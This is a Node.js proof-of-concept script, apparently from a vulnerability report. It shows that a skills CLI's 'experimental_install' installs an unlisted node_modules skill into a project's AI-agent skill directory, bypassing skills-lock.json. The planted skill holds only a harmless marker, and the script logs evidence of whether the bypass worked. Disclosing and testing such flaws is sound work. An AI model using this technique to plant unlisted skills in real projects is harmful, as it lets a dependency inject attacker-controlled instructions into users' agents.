#!/usr/bin/env node
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import {
  existsSync,
  mkdirSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { dirname, join, relative, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const findingDir = dirname(fileURLToPath(import.meta.url));
const repoRoot = process.env.SKILLS_REPO_ROOT || resolve(findingDir, '..', '..', '..');
const evidenceDir = join(findingDir, 'evidence');
const workDir = join(evidenceDir, 'runtime-project');
const homeDir = join(evidenceDir, 'home');
const cliPath = process.env.SKILLS_CLI || (
  existsSync(join(repoRoot, 'dist', 'cli.mjs'))
    ? join(repoRoot, 'bin', 'cli.mjs')
    : join(repoRoot, 'src', 'cli.ts')
);

function ensureDir(path) {
  mkdirSync(path, { recursive: true });
}

function write(path, content) {
  ensureDir(dirname(path));
  writeFileSync(path, content, 'utf8');
}

function collectFiles(base, current, out) {
  for (const entry of readdirSync(current, { withFileTypes: true })) {
    const full = join(current, entry.name);
    if (entry.isDirectory()) {
      if (entry.name === '.git' || entry.name === 'node_modules') continue;
      collectFiles(base, full, out);
    } else if (entry.isFile()) {
      out.push({ rel: relative(base, full).split('\\').join('/'), buf: readFileSync(full) });
    }
  }
}

function skillFolderHash(dir) {
  const files = [];
  collectFiles(dir, dir, files);
  files.sort((a, b) => a.rel.localeCompare(b.rel));
  const h = createHash('sha256');
  for (const file of files) {
    h.update(file.rel);
    h.update(file.buf);
  }
  return h.digest('hex');
}

function run(cmd, args, opts = {}) {
  return spawnSync(cmd, args, {
    cwd: opts.cwd || repoRoot,
    encoding: 'utf8',
    env: {
      ...process.env,
      DISABLE_TELEMETRY: '1',
      DO_NOT_TRACK: '1',
      NO_COLOR: '1',
      FORCE_COLOR: '0',
      TERM: 'dumb',
      CI: '1',
      HOME: homeDir,
      USERPROFILE: homeDir,
    },
  });
}

function statusLine(status, evidence, notes = '') {
  console.log(JSON.stringify({ status, evidence, notes }));
}

function main() {
  ensureDir(evidenceDir);
  ensureDir(homeDir);
  rmSync(workDir, { recursive: true, force: true });
  ensureDir(workDir);

  const benignDir = join(workDir, 'node_modules', 'benign-skill-package');
  const evilDir = join(workDir, 'node_modules', 'transitive-evil-package');
  ensureDir(benignDir);
  ensureDir(evilDir);

  write(join(workDir, 'package.json'), JSON.stringify({
    name: 'skills-lock-restore-victim',
    private: true,
    dependencies: {
      'benign-skill-package': '1.0.0',
      'transitive-evil-package': '1.0.0'
    }
  }, null, 2) + '\n');

  write(join(benignDir, 'package.json'), JSON.stringify({
    name: 'benign-skill-package',
    version: '1.0.0'
  }, null, 2) + '\n');
  write(join(benignDir, 'SKILL.md'), `---
name: safe-locked-skill
description: Legitimate node_modules skill already recorded in skills-lock.json
---
# Safe locked skill
`);

  write(join(evilDir, 'package.json'), JSON.stringify({
    name: 'transitive-evil-package',
    version: '1.0.0'
  }, null, 2) + '\n');
  write(join(evilDir, 'SKILL.md'), `---
name: malicious-lock-bypass
description: Unlisted dependency skill installed during lock restore
---
# Malicious lock bypass proof
ATTACKER_CONTROLLED_MARKER: unlisted-node-modules-skill-installed
`);

  const beforeLock = {
    version: 1,
    skills: {
      'safe-locked-skill': {
        source: 'benign-skill-package',
        sourceType: 'node_modules',
        computedHash: skillFolderHash(benignDir),
      },
    },
  };
  write(join(workDir, 'skills-lock.json'), JSON.stringify(beforeLock, null, 2) + '\n');
  write(join(evidenceDir, 'skills-lock.before.json'), JSON.stringify(beforeLock, null, 2) + '\n');

  const health = run(process.execPath, [cliPath, '--version']);
  write(join(evidenceDir, 'healthcheck.log'), [
    `$ ${process.execPath} ${cliPath} --version`,
    `cwd=${repoRoot}`,
    `exit=${health.status}`,
    '--- stdout ---',
    health.stdout || '',
    '--- stderr ---',
    health.stderr || '',
  ].join('\n'));

  const exploit = run(process.execPath, [cliPath, 'experimental_install'], { cwd: workDir });
  write(join(evidenceDir, 'exploit.log'), [
    `$ (cd ${workDir} && ${process.execPath} ${cliPath} experimental_install)`,
    `exit=${exploit.status}`,
    '--- stdout ---',
    exploit.stdout || '',
    '--- stderr ---',
    exploit.stderr || '',
  ].join('\n'));

  const installedPath = join(workDir, '.agents', 'skills', 'malicious-lock-bypass', 'SKILL.md');
  const installed = existsSync(installedPath) ? readFileSync(installedPath, 'utf8') : '';
  const afterLockText = existsSync(join(workDir, 'skills-lock.json'))
    ? readFileSync(join(workDir, 'skills-lock.json'), 'utf8')
    : '{}';
  write(join(evidenceDir, 'skills-lock.after.json'), afterLockText);

  let afterLock = { skills: {} };
  try {
    afterLock = JSON.parse(afterLockText);
  } catch {}

  const beforeHadEvil = Object.prototype.hasOwnProperty.call(beforeLock.skills, 'malicious-lock-bypass');
  const afterHasEvil = Object.prototype.hasOwnProperty.call(afterLock.skills || {}, 'malicious-lock-bypass');
  const markerSeen = installed.includes('ATTACKER_CONTROLLED_MARKER: unlisted-node-modules-skill-installed');
  const confirmed = !beforeHadEvil && markerSeen;

  write(join(evidenceDir, 'impact.log'), [
    'Impact: unlisted dependency-controlled skill persisted into the project agent skill directory.',
    `Original lockfile skills: ${Object.keys(beforeLock.skills).join(', ')}`,
    `Original lockfile contained malicious-lock-bypass: ${beforeHadEvil}`,
    `Post-install lockfile contains malicious-lock-bypass: ${afterHasEvil}`,
    `Installed unlisted SKILL.md exists: ${existsSync(installedPath)}`,
    `Installed path: ${installedPath}`,
    '--- installed SKILL.md ---',
    installed || '<missing>',
  ].join('\n'));

  write(join(evidenceDir, 'env-info.txt'), [
    `node=${process.version}`,
    `platform=${process.platform} ${process.arch}`,
    `repoRoot=${repoRoot}`,
    `cliPath=${cliPath}`,
    `workDir=${workDir}`,
  ].join('\n') + '\n');

  console.log(`Fixture: ${workDir}`);
  console.log(`Lock before restore listed: ${Object.keys(beforeLock.skills).join(', ')}`);
  console.log(`Installed unlisted skill: ${existsSync(installedPath)} (${relative(workDir, installedPath)})`);

  if (confirmed) {
    statusLine('confirmed', 'unlisted malicious-lock-bypass SKILL.md persisted in .agents/skills', `lock initially listed only ${Object.keys(beforeLock.skills).join(', ')}`);
  } else {
    statusLine('failed', 'unlisted skill was not installed', `cli_exit=${exploit.status}; markerSeen=${markerSeen}`);
  }
}

try {
  main();
} catch (err) {
  const message = err instanceof Error ? `${err.name}: ${err.message}` : String(err);
  try {
    ensureDir(evidenceDir);
    write(join(evidenceDir, 'impact.log'), `PoC execution error: ${message}\n`);
  } catch {}
  console.error(message);
  statusLine('failed', 'PoC execution error before impact could be observed', message);
}
